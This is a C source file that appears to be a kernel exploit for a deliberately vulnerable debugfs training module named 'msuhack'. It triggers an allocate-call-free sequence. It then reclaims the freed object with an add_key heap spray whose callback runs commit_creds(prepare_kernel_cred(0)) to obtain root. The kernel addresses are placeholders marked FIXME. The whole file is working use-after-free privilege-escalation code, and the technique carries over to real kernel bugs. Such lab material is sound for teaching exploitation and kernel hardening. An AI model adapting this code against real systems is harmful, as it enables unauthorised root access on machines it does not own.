#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <keyutils.h>
#include <sys/syscall.h>
#include <stdbool.h>

#define PAYLOAD_SZ		8000

/* ============================== Kernel stuff ============================== */

/* FIXME: need proper addresses */
#define COMMIT_CREDS_PTR	0xffffffffc001cafelu
#define PREPARE_KERNEL_CRED_PTR	0xffffffffcafec001lu

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2)
{
	commit_creds(prepare_kernel_cred(0));
}

struct msuhack_item_t {
	uint32_t foo;
	uint64_t callback;
	char bar[1];
};

/* ========================================================================== */

void init_payload(char *p)
{
	struct msuhack_item_t *item = (struct msuhack_item_t *)p;

	item->callback = (uint64_t)root_it;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback %lx\n", item->callback);
}

int act(int fd, char code)
{
	ssize_t bytes = 0;

	bytes = write(fd, &code, 1);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	char payload[PAYLOAD_SZ] = { 0 };
	key_serial_t key = -1;

	/*
	 * Prepare
	 */

	fd = open("/sys/kernel/debug/msuhack/msuhack_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open msuhack_act");
		goto end;
	}

	printf("[+] msuhack_act opened\n");

	if (act(fd, '1') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] MSUHACK_ACT_ALLOC\n");

	if (act(fd, '2') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] MSUHACK_ACT_CALLBACK\n");

	if (act(fd, '3') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] MSUHACK_ACT_FREE\n");

	/*
	 * Crash
	 */

	init_payload(payload);

	key = syscall(__NR_add_key, "user", "payload",
				payload, PAYLOAD_SZ, KEY_SPEC_PROCESS_KEYRING);
	if (key < 0) {
		perror("[-] add_key");
		goto end;
	}

	if (act(fd, '2') == EXIT_FAILURE)
		goto end;
	else
		printf("[+] MSUHACK_ACT_CALLBACK\n");

	ret = EXIT_SUCCESS;

end:
	if (key)
		syscall(__NR_keyctl, KEYCTL_INVALIDATE, key);

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close");
	}

	return ret;
}
